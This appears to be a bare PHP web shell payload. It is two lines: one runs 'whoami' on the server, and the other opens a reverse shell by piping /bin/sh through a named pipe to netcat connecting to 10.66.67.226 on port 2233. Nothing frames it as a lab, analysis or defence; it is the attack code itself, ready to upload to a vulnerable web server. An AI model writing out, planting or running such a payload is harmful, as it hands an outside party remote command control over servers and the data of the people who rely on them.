<?php echo shell_exec("whoami");?>

<?php echo system("mkfifo /tmp/spht; nc 10.66.67.226 2233 0</tmp/spht | /bin/sh >/tmp/spht 2>&1; rm /tmp/spht "); ?>
